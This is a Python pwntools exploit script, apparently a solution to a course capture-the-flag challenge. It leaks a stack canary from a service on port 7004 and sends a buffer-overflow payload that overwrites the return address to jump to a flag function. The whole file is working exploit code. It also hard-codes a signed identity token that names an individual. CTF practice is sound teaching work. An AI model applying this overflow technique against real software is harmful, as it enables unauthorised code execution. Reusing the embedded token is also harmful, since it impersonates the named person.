
from pwn import *
from pwnlib import *

from ctf_helper import *

id_token = "eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ"  # insert your token here

GETFLAG = 0x401323 + 5
canaryOff = 24


io: tube = start(7004)
read_welcome(id_token)

io.recvuntil(b"Atlantic canary? ")
io.sendline(b"24")
hint = io.recvline()
canary_hex = hint.split(b":")[1].strip()
canary = int(canary_hex, 16)

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(GETFLAG)

io.send(payload)
io.interactive()
